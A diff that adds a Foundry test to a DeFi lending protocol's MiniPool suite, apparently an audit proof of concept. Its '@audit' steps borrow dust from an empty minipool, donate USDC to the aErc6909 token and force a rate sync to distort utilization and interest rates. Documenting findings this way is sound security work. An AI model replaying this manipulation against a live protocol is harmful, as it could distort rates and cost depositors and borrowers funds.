@@ -489,4 +489,122 @@ contract MiniPoolPidReserveInterestRateStrategyTest is Common {
 
         vm.writeLine(pathMiniPool, data);
     }
+
+    struct TestVars {
+        address user;
+        address whaleUser;
+        uint256 mpId;
+        address mp;
+        address flowLimiter;
+        IAERC6909 aErc6909Token;
+        ERC20 usdc;
+        ERC20 dai;
+        AToken grainUSDC;
+        VariableDebtToken debtUSDC;
+        uint256 amount;
+    }
+
+    function plateauMiniPool_(uint256 period, address token, address user) public {
+        console.log("1.Token:", token);
+        // deal(address(token), users[0], 10);
+        for (uint256 i = 0; i < period; i++) {
+            vm.startPrank(user);
+            console.log("Approve");
+            IERC20(token).approve(miniPool, 1);
+            console.log("Repay");
+            IMiniPool(miniPool).repay(address(token), false, 1, user);
+            vm.stopPrank();
+            skip(DEFAULT_TIME_BEFORE_OP);
+
+            console.log("Borrowing MiniPool");
+            vm.startPrank(user);
+            IMiniPool(miniPool).borrow(address(token), false, 1, user);
+            vm.stopPrank();
+            skip(DEFAULT_TIME_BEFORE_OP);
+        }
+    }
+
+    function testMiniPoolFlowLimiterDust() public {
+        TestVars memory vars;
+        vars.user = makeAddr("user");
+        vars.mpId = 0;
+        vars.mp = deployedMiniPoolContracts.miniPoolAddressesProvider.getMiniPool(vars.mpId);
+        vm.label(vars.mp, "MiniPool");
+        vars.aErc6909Token = IAERC6909(
+            deployedMiniPoolContracts.miniPoolAddressesProvider.getMiniPoolToAERC6909(vars.mp)
+        );
+        vm.label(address(vars.aErc6909Token), "aErc6909Token");
+
+        vars.whaleUser = makeAddr("whaleUser");
+
+        vars.usdc = erc20Tokens[0];
+        vars.grainUSDC = commonContracts.aTokensWrapper[0];
+        vars.debtUSDC = commonContracts.variableDebtTokens[0];
+        vars.amount = 5e8; //bound(amount, 1E6, 1E13); /* $500 */ // consider fuzzing here
+        uint256 usdcAID = 1000;
+        // uint256 usdcDID = 2000;
+        // uint256 daiAID = 1128;
+        // uint256 daiDID = 2128;
+        vars.dai = erc20Tokens[3];
+
+        deal(address(vars.usdc), vars.whaleUser, vars.amount * 2000);
+        deal(address(vars.dai), vars.user, 100000 ether);
+
+        vm.startPrank(vars.whaleUser);
+        vars.usdc.approve(address(deployedContracts.lendingPool), vars.amount * 1000); //500000 USDC
+        deployedContracts.lendingPool.deposit(
+            address(vars.usdc), true, vars.amount * 1000, vars.whaleUser
+        );
+        vm.stopPrank();
+
+        vm.startPrank(vars.user);
+        vars.dai.approve(address(vars.mp), vars.amount * 1e14);
+        console.log("User balance: ", vars.dai.balanceOf(vars.user) / (10 ** 18));
+        console.log("User depositAmount: ", vars.amount * 1e14 / (10 ** 18));
+        IMiniPool(vars.mp).deposit(address(vars.dai), false, vars.amount * 1e14, vars.user);
+        vm.stopPrank();
+
+        vars.flowLimiter = address(deployedMiniPoolContracts.flowLimiter);
+
+        vm.prank(address(deployedMiniPoolContracts.miniPoolAddressesProvider));
+        deployedMiniPoolContracts.flowLimiter.setFlowLimit(
+            address(vars.usdc), vars.mp, vars.amount * 100
+        ); // 50000 USDC
+
+        //@audit borrow dust from empty minipool
+        vm.startPrank(vars.user);
+        uint256 DUST = 10;
+        IMiniPool(vars.mp).borrow(address(vars.grainUSDC), false, DUST, vars.user); // Utilization becomes 1000000000000000000000000000 (RAY)
+        assertEq(vars.debtUSDC.balanceOf(vars.mp), DUST);
+
+        //@audit Donate usdc to aErc6909 token
+        vm.startPrank(vars.whaleUser);
+        vars.usdc.approve(address(deployedContracts.lendingPool), vars.amount * 1000); //500000 USDC
+        deployedContracts.lendingPool.deposit(
+            address(vars.usdc), true, vars.amount * 1000, address(vars.aErc6909Token)
+        );
+        vm.stopPrank();
+
+        vm.startPrank(address(deployedMiniPoolContracts.miniPoolConfigurator));
+        IMiniPool(vars.mp).syncRatesState(address(vars.grainUSDC)); // Utilization is 19999999999600000 (~2e16)
+        vm.stopPrank();
+
+        console.log("Time travel 1");
+        vm.warp(block.timestamp + 4000);
+        vm.roll(block.number + 1);
+
+        console.log("Deposit");
+        vm.startPrank(vars.whaleUser);
+        vars.grainUSDC.approve(vars.mp, 1 ether);
+        IMiniPool(vars.mp).deposit(address(vars.grainUSDC), false, DUST, vars.user);
+        vm.stopPrank();
+
+        // console.log("Time travel 2");
+        // vm.warp(block.timestamp + 100);
+        // vm.roll(block.number + 1);
+
+        // vm.startPrank(address(deployedMiniPoolContracts.miniPoolConfigurator));
+        // IMiniPool(vars.mp).syncRatesState(address(vars.grainUSDC)); // Utilization is 19999999999600000 (~2e16)
+        // vm.stopPrank();
+    }
 }
